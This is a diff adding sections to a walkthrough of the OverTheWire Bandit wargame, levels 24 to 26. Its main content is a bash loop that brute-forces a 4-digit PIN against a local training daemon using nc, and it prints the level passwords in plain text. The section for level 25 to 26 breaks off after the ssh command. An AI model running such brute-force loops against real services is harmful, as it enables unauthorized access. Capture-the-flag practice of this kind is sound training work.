@@ -963,3 +963,59 @@ bandit23@bandit:/tmp/maxmustermann$ cat password
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
 Password for the Level 24 **UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ**
+
+## Bandit Level 24 -> 25
+
+### Level Goal
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+### Solution
+```
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
+```
+bandit24@bandit:~$ mkdir /tmp/mustermann
+bandit24@bandit:~$ cd /tmp/mustermann
+bandit24@bandit:/tmp/mustermann$
+```
+```
+bandit24@bandit:/tmp/mustermann$ cat brute.sh 
+#!/bin/bash
+for i in {0000..9999}
+do 
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+```
+```
+bandit24@bandit:/tmp/mustermann$ ./brute.sh > combinations.txt
+```
+```
+...
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9993
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9994
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9995
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9996
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9997
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9998
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999
+```
+```
+bandit24@bandit:/tmp/mustermann$ nc localhost 30002 < combinations.txt
+...
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
+
+Password for the Level 24 **uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG**
+
+## Bandit Level 25 -> 26
+
+### Level Goal
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+### Solution
+```
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+```
